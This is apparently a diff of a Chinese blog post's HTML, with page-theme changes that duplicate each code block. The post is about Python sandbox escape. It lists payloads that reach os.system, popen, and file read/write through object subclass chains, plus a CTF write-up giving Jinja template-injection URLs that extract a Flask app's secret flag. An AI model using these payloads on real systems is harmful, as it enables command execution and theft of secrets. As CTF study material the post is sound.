+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 利用file()函数读取文件：（写类似）</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;./test.py&#x27;</span>).read()</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 __getattibute__ 方法</span></span><br><span class="line"></span><br><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;tch_warnings&#x27;</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>python3 </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">-4</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">93</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">93</span>].__init__.__globals__[<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
 
 <h2 id="eg"><a href="#eg" class="headerlink" title="eg"></a>eg</h2><p>一道ctf记录</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>注入点在路径 <code>/shrine/&lt;path:shrine&gt;</code></p>
 <p>过滤了()  并且把config self置为空</p>
 <p>要是没被处理 可以用</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config</span></span><br><span class="line">http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;config&#125;&#125;</span><br><span class="line"><span class="comment"># self</span></span><br><span class="line"><span class="comment"># &#123;&#123;self&#125;&#125; =&gt; &lt;TemplateReference None&gt;</span></span><br><span class="line">http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;self.__dict__&#125;&#125;</span><br><span class="line"><span class="comment"># ()</span></span><br><span class="line">http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">68</span>].__init__.__globals__[<span class="string">'os'</span>].__dict__.environ[<span class="string">'FLAG'</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config</span></span><br><span class="line">http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;config&#125;&#125;</span><br><span class="line"><span class="comment"># self</span></span><br><span class="line"><span class="comment"># &#123;&#123;self&#125;&#125; =&gt; &lt;TemplateReference None&gt;</span></span><br><span class="line">http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;self.__dict__&#125;&#125;</span><br><span class="line"><span class="comment"># ()</span></span><br><span class="line">http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">68</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].__dict__.environ[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 
 <p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]&#125;&#125;</span><br><span class="line"></span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;shrine&#x2F;&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;shrine&#x2F;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
 
 <p>参考链接</p>
-<p><a href="https://juejin.im/post/5a3de02af265da432653098d" target="_blank" rel="noopener">https://juejin.im/post/5a3de02af265da432653098d</a></p>
-<p><a href="https://xz.aliyun.com/t/2308#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-4</a></p>
-<p><a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#i-7" target="_blank" rel="noopener">https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#i-7</a></p>
-
-            
-
+<p><a class="link" target="_blank" rel="noopener" href="https://juejin.im/post/5a3de02af265da432653098d">https://juejin.im/post/5a3de02af265da432653098d<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2308#toc-4">https://xz.aliyun.com/t/2308#toc-4<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#i-7">https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#i-7<i class="fas fa-external-link-alt"></i></a></p>
 
         </div>
-    </div>
-    <div id="post-footer" class="post-footer main-content-wrap">
+
         
-        
-            <div class="post-actions-wrap">
-    <nav>
-        <ul class="post-actions post-action-nav">
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/14/CBC字节翻转/"
-                    data-tooltip="CBC字节翻转"
-                    aria-label="上一篇: CBC字节翻转"
-                >
-                    
-                        <i class="fa fa-angle-left" aria-hidden="true"></i>
-                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
-                    </a>
-            </li>
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/13/Lamp-Security-CTF4/"
-                    data-tooltip="Lamp-Security-CTF4"
-                    aria-label="下一篇: Lamp-Security-CTF4"
-                >
-                    
-                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
-                        <i class="fa fa-angle-right" aria-hidden="true"></i>
-                    </a>
-            </li>
-        </ul>
-    </nav>
-    <ul class="post-actions post-action-share">
-        <li class="post-action hide-lg hide-md hide-sm">
-            <a
-                class="post-action-btn btn btn--default btn-open-shareoptions"
-                href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
-            >
-                <i class="fa fa-share-alt" aria-hidden="true"></i>
-            </a>
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：python沙盒逃逸two</li>
+        <li>Post author：p1k</li>
+        <li>Create time：2019-09-13 21:35:24</li>
+        <li>
+            Post link：http://p1keman.github.io/2019/09/13/python沙盒逃逸two/
         </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
-                    title="分享到 Facebook"
-                    aria-label="分享到 Facebook"
-                >
-                    <i class="fab fa-facebook" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
-                    title="分享到 Twitter"
-                    aria-label="分享到 Twitter"
-                >
-                    <i class="fab fa-twitter" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
-                    title="分享到 Google+"
-                    aria-label="分享到 Google+"
-                >
-                    <i class="fab fa-google-plus" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-        
-            
-        
-        <li class="post-action">
-            
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
-            
-                <i class="fa fa-list" aria-hidden="true"></i>
-            </a>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
         </li>
     </ul>
 </div>
 
+            </div>
+        
 
         
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2019/09/14/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">CBC字节翻转</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2019/09/13/Lamp-Security-CTF4/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Lamp-Security-CTF4</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
         
-            
+
         
     </div>
-</article>
+</div>
 
 
+                
+            </div>
 
-                <footer id="footer" class="main-content-wrap">
-    <span class="copyrights">
-        Copyrights &copy; 2020 John Doe. All Rights Reserved.
-    </span>
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">p1k</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.3.1</a>
+        </div>
+    </div>
 </footer>
 
-            </div>
-            
-                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
-                    <div class="post-actions-wrap">
-    <nav>
-        <ul class="post-actions post-action-nav">
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/14/CBC字节翻转/"
-                    data-tooltip="CBC字节翻转"
-                    aria-label="上一篇: CBC字节翻转"
-                >
-                    
-                        <i class="fa fa-angle-left" aria-hidden="true"></i>
-                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
-                    </a>
-            </li>
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/13/Lamp-Security-CTF4/"
-                    data-tooltip="Lamp-Security-CTF4"
-                    aria-label="下一篇: Lamp-Security-CTF4"
-                >
-                    
-                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
-                        <i class="fa fa-angle-right" aria-hidden="true"></i>
-                    </a>
-            </li>
-        </ul>
-    </nav>
-    <ul class="post-actions post-action-share">
-        <li class="post-action hide-lg hide-md hide-sm">
-            <a
-                class="post-action-btn btn btn--default btn-open-shareoptions"
-                href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
-            >
-                <i class="fa fa-share-alt" aria-hidden="true"></i>
-            </a>
-        </li>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
         
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
-                    title="分享到 Facebook"
-                    aria-label="分享到 Facebook"
-                >
-                    <i class="fab fa-facebook" aria-hidden="true"></i>
-                </a>
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
             </li>
         
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
-                    title="分享到 Twitter"
-                    aria-label="分享到 Twitter"
-                >
-                    <i class="fab fa-twitter" aria-hidden="true"></i>
-                </a>
-            </li>
+
+        <!-- go comment -->
         
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
-                    title="分享到 Google+"
-                    aria-label="分享到 Google+"
-                >
-                    <i class="fab fa-google-plus" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-        
-            
-        
-        <li class="post-action">
-            
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
-            
-                <i class="fa fa-list" aria-hidden="true"></i>
-            </a>
-        </li>
     </ul>
 </div>
 
-
-                </div>
-                
-    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
-        <i id="btn-close-shareoptions" class="fa fa-times"></i>
-        <ul class="share-options">
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
-                        aria-label="分享到 Facebook"
-                    >
-                        <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
-                    </a>
-                </li>
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
-                        aria-label="分享到 Twitter"
-                    >
-                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
-                    </a>
-                </li>
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
-                        aria-label="分享到 Google+"
-                    >
-                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
-                    </a>
-                </li>
-            
-        </ul>
-    </div>
-
-
-            
         </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
         
 
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
 
-<div id="about">
-    <div id="about-card">
-        <div id="about-btn-close">
-            <i class="fa fa-times"></i>
-        </div>
-        
-            <h4 id="about-card-name">John Doe</h4>
-        
-            <div id="about-card-bio"><p>author.bio</p>
-</div>
-        
-        
-            <div id="about-card-job">
-                <i class="fa fa-briefcase"></i>
-                <br/>
-                <p>author.job</p>
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
 
-            </div>
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
         
-        
-    </div>
+    </ul>
 </div>
 
-        
-        
-<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
-        <!--SCRIPTS-->
-<script src="/assets/js/script-hvks0tjho7hhxxjwgvjgerqzsheh4pu8sgih6uruqsx2fdeiyiflclfy2v4q.min.js"></script>
-<!--SCRIPTS END-->
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E6%96%B9%E6%B3%95"><span class="nav-text">特殊方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#f%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="nav-text">f修饰符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getattr-self-attr"><span class="nav-text">getattr(self,attr)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getattribute-self-attr"><span class="nav-text">__getattribute__ (self,attr)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#init"><span class="nav-text">__init__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#globals"><span class="nav-text">__globals__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call"><span class="nav-text">__call__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#class"><span class="nav-text">__class__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mro"><span class="nav-text">__mro__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#base-bases"><span class="nav-text">__base__  __bases__</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%90%8D%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="nav-text">函数名被过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%A7%E6%89%BF%E9%93%BE"><span class="nav-text">继承链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eg"><span class="nav-text">eg</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
 
 
     
 
+</main>
 
 
 
-    </body>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
 </html>
